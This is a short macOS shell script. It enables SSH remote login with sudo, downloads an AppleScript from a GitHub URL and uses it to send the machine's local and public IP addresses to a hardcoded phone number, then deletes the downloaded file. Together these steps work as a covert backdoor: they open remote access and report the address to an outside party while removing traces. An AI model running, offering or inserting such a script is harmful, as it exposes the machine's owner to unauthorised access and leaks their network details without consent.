#!/bin/sh
sudo systemsetup -f -setremotelogin on
wget https://raw.githubusercontent.com/fscty/code_/master/temp/send.scpt
osascript send.scpt +33783549426 $(ipconfig getifaddr en0)
osascript send.scpt +33783549426 $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
osascript send.scpt +33783549426 $(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
rm send.scpt
